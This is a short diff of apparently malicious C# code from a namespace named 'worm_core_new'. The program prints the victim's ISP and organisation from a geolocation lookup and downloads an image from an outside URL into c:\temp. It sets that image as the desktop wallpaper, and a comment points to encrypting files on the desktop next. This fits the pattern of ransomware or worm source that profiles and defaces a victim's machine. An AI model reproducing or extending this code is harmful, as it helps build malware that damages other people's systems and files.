@@ -51,7 +51,10 @@ namespace worm_core_new
             Console.WriteLine("ISP: " + json["isp"] + ", " + json["org"]);
 
             // Change desktop background
-            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, @"C:/Users/Matthew/Pictures/Drivers License.JPG", SPIF_UPDATEINIFILE);
+            Directory.CreateDirectory(@"c:\temp\");
+            client.DownloadFile(new Uri("https://i.imgur.com/yBhRcfo.jpg"), @"c:\temp\image.png");
+
+            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, @"c:\temp\image.png", SPIF_UPDATEINIFILE);
             Console.WriteLine("\nChanged desktop background");
 
             //Encrypting file on desktop 
